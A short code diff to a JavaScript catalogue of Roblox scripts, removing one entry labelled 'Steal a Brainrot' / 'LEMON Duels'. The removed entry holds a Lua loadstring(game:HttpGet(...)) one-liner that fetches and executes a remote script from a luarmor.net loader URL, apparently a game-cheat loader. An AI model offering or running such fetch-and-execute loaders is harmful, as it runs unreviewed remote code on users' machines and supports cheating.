@@ -84,12 +84,6 @@ const SCRIPT_DATA = {
     ],
   },
 };
-3: {
-    label: 'Steal a Brainrot(ブレロ)',
-    cards: [
-      { label: 'LEMON Duels', code: 'loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/387a5df3b561f6821c25654316d0e352.lua"))()' },
-       ],
-  },
 function initScriptPage () {
   const select = document.getElementById('scriptSelect');
   if (!select) return; // sc.html 以外では何もしない
